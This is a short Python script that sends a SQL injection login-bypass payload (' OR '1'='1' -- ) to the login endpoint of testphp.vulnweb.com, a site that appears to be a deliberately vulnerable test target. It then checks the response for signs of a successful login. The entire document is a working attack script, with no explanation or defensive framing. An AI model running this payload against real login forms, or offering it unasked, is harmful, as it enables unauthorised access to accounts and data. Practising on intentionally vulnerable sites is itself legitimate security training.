import requests

url = "http://testphp.vulnweb.com/userinfo.php" 

payload = {
    "uname": "' OR '1'='1' -- ",
    "pass": "Anything_You_Can_Write_as_Passowrd"
}

response = requests.post(url, data=payload)

if response.status_code == 200 and ("Welcome" in response.text or "dashboard" in response.text or "logout" in response.text):
    print(f"[+] SQL Injection Successful with payload:")
else:
    print("[-] Injection Failed!! Server response did not indicate success.")
